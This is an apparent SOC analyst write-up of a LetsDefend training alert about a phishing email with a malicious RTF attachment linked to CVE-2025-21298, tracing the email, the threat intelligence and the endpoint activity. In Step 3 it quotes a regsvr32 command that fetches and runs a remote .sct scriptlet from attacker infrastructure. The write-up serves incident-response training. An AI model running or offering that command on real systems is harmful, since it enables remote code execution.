# SOC336 – Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)

## Executive Summary

This investigation analyzed a **critical email-based attack** involving a malicious RTF attachment associated with **CVE-2025-21298 (Windows OLE Zero-Click Remote Code Execution)**.

The investigation began after a suspicious email containing an RTF attachment triggered a high-confidence security alert. By correlating **email telemetry**, **threat intelligence**, **endpoint activity**, and **proxy logs**, I confirmed that the attachment was malicious and led to post-delivery execution on the target endpoint.

The compromised workstation executed **`cmd.exe`** from **`OUTLOOK.EXE`**, abused the Windows LOLBin **`regsvr32.exe`** to retrieve a remote **`.sct`** payload, and successfully connected to attacker-controlled infrastructure.

Based on the available evidence, the incident was classified as a **True Positive** and escalated for Incident Response.


# Alert Overview

| Field | Value |
|---------|--------|
| Severity | Critical |
| Category | Malware |
| Rule | SOC336 – Windows OLE Zero-Click RCE Exploitation Detected |
| CVE | CVE-2025-21298 |
| Source Email | projectmanagement@pm.me |
| Recipient | Austin@letsdefend.io |
| Subject | Important: Action Required for Upcoming Project Deadline |
| Attachment | mail.rtf |
| SHA256 | df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184 |
| Detection Source | Email Security |
| Device Action | Allowed |


# Investigation Timeline

| Time | Activity |
|------|----------|
| 05:12 | Suspicious email delivered to the victim |
| 05:13 | Email security alert generated |
| 05:15 | Attachment reputation validated using VirusTotal |
| 08:06 | Endpoint investigation revealed suspicious command execution |
| 08:06 | Proxy logs confirmed outbound connection to attacker infrastructure |
| 08:08 | Evidence correlated across all telemetry sources |
| 08:10 | Incident classified as True Positive and escalated |


# Technical Investigation

## Step 1 – Email Analysis

The investigation began by reviewing the email responsible for triggering the alert.

The message originated from an external sender:

> **projectmanagement@pm.me**

with the subject:

> **"Important: Action Required for Upcoming Project Deadline"**

The email attempted to convince the recipient to review an attached project document, creating a sense of urgency commonly observed in phishing campaigns.

Several characteristics immediately increased the confidence level of the alert:

- External and untrusted sender.
- Business-themed social engineering lure.
- Suspicious RTF attachment.
- Detection associated with CVE-2025-21298.

### Email Evidence

| Field | Value |
|------|------|
| From | projectmanagement@pm.me |
| To | Austin@letsdefend.io |
| Subject | Important: Action Required for Upcoming Project Deadline |
| Attachment | mail.rtf |
| Attachment Password | infected |
| Email Action | Allowed |

### Analyst Assessment

Although the email alone was highly suspicious, additional evidence was required to determine whether the attachment actually resulted in endpoint compromise.


## Step 2 – Threat Intelligence Validation

The next phase focused on validating the attachment using external threat intelligence.

The SHA256 hash of the attached RTF document was analyzed in **VirusTotal**, where the sample was detected by **27 out of 61 security vendors**.

Several detections explicitly referenced:

- CVE-2025-21298
- Malicious RTF exploitation
- Trojan behavior
- Microsoft Office exploit activity

### Attachment Reputation

| Field | Value |
|------|------|
| File Name | mail.rtf |
| SHA256 | df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184 |
| VirusTotal Detection | 27 / 61 |
| Detection Themes | Exploit, Trojan, Malicious RTF, CVE-2025-21298 |

### Notable Detection Examples

- Exploit.CVE-2025-21298
- RTF:CVE-2025-21298
- Trojan.MSOffice.CVE-2025-21298

### Analyst Assessment

The threat intelligence strongly supported the legitimacy of the alert and significantly increased confidence that the attachment was intentionally crafted to exploit Windows OLE vulnerabilities.

However, reputation alone cannot confirm successful compromise. Endpoint telemetry was required to determine whether the malicious document had actually executed code on the victim's workstation.


## Step 3 – Endpoint Investigation

After validating the malicious attachment, the investigation moved to **LetsDefend Endpoint Security** to determine whether the email resulted in code execution.

A review of the endpoint process history revealed a suspicious execution chain involving **Microsoft Outlook**, **cmd.exe**, and **regsvr32.exe**.


### Finding 1 – Outlook Spawned cmd.exe

**Observed Process Chain**

```text
OUTLOOK.EXE
        │
        └── cmd.exe
```

### Why this is Suspicious

Microsoft Outlook normally launches applications used to open documents, hyperlinks, or email attachments.

Spawning **cmd.exe** directly is highly unusual and frequently associated with exploitation of malicious Office or RTF documents.

This finding suggested that the email attachment likely triggered command execution immediately after being opened.

### Analyst Assessment

This was the first endpoint artifact indicating that the malicious email progressed beyond delivery and achieved code execution on the victim's workstation.

### Finding 2 – LOLBin Abuse using regsvr32.exe

**Observed Command**

```cmd
C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
```

### Why this is Suspicious

`regsvr32.exe` is a legitimate Microsoft binary frequently abused as a **Living-off-the-Land Binary (LOLBin)**.

Instead of registering a local DLL, the command instructed **regsvr32.exe** to retrieve and execute a remote **`.sct` scriptlet** hosted on attacker-controlled infrastructure.

Several indicators immediately stood out:

- Execution initiated through `cmd.exe`.
- Remote URL supplied using the `/i:` parameter.
- Usage of `scrobj.dll` to process the downloaded scriptlet.
- Direct relationship with the suspicious Outlook process chain.

### Analyst Assessment

This represented strong evidence of post-delivery malicious execution.

Rather than simply opening the attachment, the endpoint attempted to retrieve and execute additional attacker-controlled content using a legitimate Windows binary, a common technique used to evade traditional security controls.
